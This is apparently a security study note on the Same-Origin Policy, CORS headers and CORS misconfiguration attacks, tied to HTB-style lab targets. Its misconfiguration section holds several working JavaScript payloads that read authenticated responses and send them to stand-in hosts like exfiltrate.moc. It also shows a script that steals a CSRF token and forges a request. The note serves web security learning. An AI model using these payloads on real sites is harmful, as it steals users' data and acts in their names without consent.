---
description: Javascript | Exfiltrate | SOP | CORS | Bypass | Tokens
---

# Same-Origin Policy & CORS

### <mark style="color:yellow;">Same-Origin Policy</mark>

SOP ensures that scripts running on one website (origin) cannot acces or manipulate resources on a different website (origin).&#x20;

#### An origin is defined by 3 URL components:

* **Scheme**: Protocol used (http, https , ftp)
* **Host**: Domain name or IP (example.com)
* **Port**: Network port (80 or 443)

{% hint style="info" %}
Two URLs share the same origin **only** if all three components are identical.
{% endhint %}

#### Different Schemes

`http://example.com` and `https://example.com` are **different origins** because of the scheme.

#### Different Hosts

`https://academy.zencorp.com` and `https://zencorp.com` are **different origins** because of the host.

#### Different Ports

`https://zencorp.com` and `https://zencorp.com:8080` are **different origins** because of the port.

### <mark style="color:yellow;">Why is SOP Important?</mark>

In summary, the **Same-Origin Policy** is a foundational security feature that isolates websites from one another. Without SOP, a malicious website could access senstive data for example:

{% hint style="info" %}
**Access Sensitive Data**

If you are logged into `bank.com`, a malicious site (`evil.com`) could run JavaScript to steal your bank account details.

**Manipulate Resources**

`evil.com` could modify your data or trigger unwanted actions on another site you are logged into.
{% endhint %}

### <mark style="color:yellow;">Cross-Origin Resource Sharing (CORS)</mark>&#x20;

**Cross-Origin Resource Sharing (CORS)** is a W3C standard that allows a web server to define exceptions to the Same-Origin Policy (SOP). It enables website to securely share resources across different origins by defining trusted origins and HTTP methods.

> Imagine a web application hosted at `http://vulnerablesite.htb` fetching data from an API at `http://api.vulnerablesite.htb`. SOP blocks these requests however using CORS it allows the API to permit requests from `http://vulnerablesite.htb`, giving access to the data.

### <mark style="color:yellow;">How does CORS work?</mark>

{% stepper %}
{% step %}
**Access-Control-Allow-Origin**

Specifies which origins can access the resource.
{% endstep %}

{% step %}
**Access-Control-Allow-Methods**

Lists allowed HTTP methods (e.g., GET, POST).
{% endstep %}

{% step %}
**Access-Control-Allow-Headers**

Lists permitted HTTP headers.
{% endstep %}

{% step %}
**Access-Control-Allow-Credentials**

Allows requests with credentials (cookies, tokens).
{% endstep %}

{% step %}
**Access-Control-Max-Age**

Defines how long CORS info is cached.
{% endstep %}
{% endstepper %}

### <mark style="color:yellow;">PreFlight Requests</mark>

For non-simple requests like using custom headers like application/json a OPTIONS request is first send checking if the server allows it. This request contains:

* **Access-Control-Request-Method**: HTTP method of the actual request.
* **Access-Control-Request-Headers**: Custom headers in the actual request.

If the server responds with the right CORS headers the browsers proceeds with the request.&#x20;

{% hint style="info" %}
A front-end sends a POST request with `application/json`. The API must:

* Allow `http://vulnerablesite.htb` in `Access-Control-Allow-Origin`.
* Permit `POST` in `Access-Control-Allow-Methods`.
* Accept `Content-Type: application/json` in `Access-Control-Allow-Headers`.
{% endhint %}

### <mark style="color:yellow;">CORS Misconfigurations</mark>

Misconfigured CORS often exploits the `Access-Control-Allow-Credentials: true` header to perform authenticated requests in the victim’s context. If an attacker-controlled domain gains SOP exceptions:

### <mark style="color:yellow;">Arbitrary Origin Reflection</mark>

The `Access-Control-Allow-Origin` header specifies which origins bypass SOP. A wildcard (`*`) allows all origins but cannot be combined with `Access-Control-Allow-Credentials: true`. To allow multiple origins, some applications reflect the `Origin` header value in `Access-Control-Allow-Origin`, potentially allowing any origin.

<details>

<summary>example_script.js</summary>

```javascript
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.moc/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'http://exfiltrate.moc/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>
```

</details>



### <mark style="color:yellow;">**Improper Origin Whitelist**</mark>

Applications might validate origins using prefix or suffix matching, e.g., allowing origins ending with `vulnerablesite.htb`. This can lead to vulnerabilities if the check is too broad, permitting attacker-controlled subdomains like `attackervulnerablesite.htb`.

### <mark style="color:yellow;">Trusted</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`null`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">Origin</mark>

The `Access-Control-Allow-Origin` header can trust the `null` origin, often due to misinterpretation. A `null` origin can be forced using a sandboxed iframe.

<details>

<summary>sandbox.js</summary>

```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://api.vulnerablesite.moc/data', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'http://exfiltrate.moc/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>"></iframe>
```

</details>

### <mark style="color:yellow;">Exploitation of Internal Applications</mark>

Misconfigured internal applications trusting all origins (`*`) are vulnerable if accessed from an internal network. Attackers can craft payloads to exfiltrate internal data.

<details>

<summary>example.js</summary>

```javascript
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://172.16.0.2/data', true);
    xhr.onload = () => {
      location = 'http://exfiltrate.moc/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>
```

</details>

### <mark style="color:yellow;">**Efficient Exfiltration**</mark>

To handle large responses using Javascript its possible to parse elements and use a POST request instead of GET for exfiltration. Also splitting large data into smaller requests.&#x20;

<details>

<summary>exfiltration.js</summary>

```javascript
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://vulnerablesite.htb/profile.php', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      // parse the response
	  var doc = new DOMParser().parseFromString(xhr.response, 'text/html');

	  // exfiltrate only the interesting element
	  var msg = encodeURIComponent(doc.getElementById('private-message').innerHTML);
      location = 'https://exfiltrate.htb/log?data=' + btoa(msg);
    };
    xhr.send();
</script>
```

</details>

### <mark style="color:yellow;">Bypassing CSRF Tokens via CORS Misconfigurations</mark>

CORS misconfigurations can bypass CSRF defenses by exploiting improperly configured access controls. If `Access-Control-Allow-Credentials` is enabled, allowing session cookies with cross-origin requests, the Same-Origin policy can be bypassed.&#x20;

Misconfigured CORS allows attackers to read cross-origin responses and so retrieve a valid CSRF token from an endpoint.&#x20;

#### Prerequisites:

* SameSite = none must be set on the session cookie to enable cross-origin requests with credentials.
* Secure attribute must be used, so cookies are sent only over https.

<details>

<summary>get_csrft_token.js</summary>

```javascript
<script>
	// GET CSRF token
	var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://vulnerablesite.htb/profile.php', false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
	var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

	// do CSRF
    var csrf_req = new XMLHttpRequest();
    var params = `promote=htb-stdnt&csrf=${csrftoken}`;
    csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
	csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
</script>
```

</details>

### <mark style="color:yellow;">Combining Attack Vectors to Bypass SameSite Cookies</mark>

SameSite Cookies: Browsers decide if cookies should be sent based on the site ignoring port and subdomain differences.

* **SameSite**: `http://vulnerable.htb` and `http://sub.vulnerable.htb`
* **NOT SameSite**: `http://vulnerable.htb` and `https://vulnerable.htb`

To bypass this behavior:

* Check if a session cookie has `SameSite=La`x its sent with safe requests like `GET`.
* If an app uses `GET` for state-chaning actions, SameSite protection is bypassed.
* For `Strict` SameSite, combining a misconfigured endpoint with a client-side redirect can bypass the restriction.

{% hint style="info" %}
**How does it work?**

1. Client-side redirect occurs when target site redirects via HTML or JS instead of a server response.
2. This redirect is treated as SameSite, victim's cookies are sent even if `SameSite=Strict`.
{% endhint %}

